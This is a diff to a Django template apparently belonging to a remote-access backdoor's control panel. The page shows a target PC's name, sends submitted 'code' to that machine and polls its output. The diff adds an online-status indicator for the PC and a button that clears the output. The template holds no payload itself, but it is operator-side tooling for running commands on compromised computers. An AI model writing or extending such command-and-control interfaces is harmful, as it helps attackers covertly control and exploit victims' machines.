@@ -1,6 +1,9 @@
 {% include 'backdoor/base.html' %}
 {% block content %}
 <h1>{{pc.pc_name}}</h1>
+<div id="online-status-{{pc.id}}">
+            
+</div>
 <div class="mb-3">
     <textarea class="form-control" id="exampleFormControlTextarea1" rows="10"></textarea>
 </div>
@@ -10,6 +13,7 @@
         <textarea class="form-control" id="code" name="code" rows="10"></textarea>
     </div>
     <button type="submit" class="btn btn-primary">Send</button>
+    <a href="{% url 'clean' pc.id %}"><button type="button" class="btn btn-dark">Clear</button></a>
 </form>
 
 <script>$(document).ready(function(){
@@ -22,6 +26,23 @@
                 document.getElementById("exampleFormControlTextarea1").value = response.data; 
                 var $textarea = $('#exampleFormControlTextarea1');
                 $textarea.scrollTop($textarea[0].scrollHeight);     
+            },
+            error: function(response)
+            {
+                console.log("b");
+            }
+        });
+    },900);
+});</script>
+<script>$(document).ready(function(){
+    setInterval(function(){
+        $.ajax({
+            type:'GET',
+            url : "{% url 'ajax-pc' pc.id %}",
+            success: function(response){
+                let element = document.getElementById("online-status-{{pc.id}}")
+                element.innerText = response.data;
+                element.classList.add(response.data);               
             },
             error: function(response)
             {
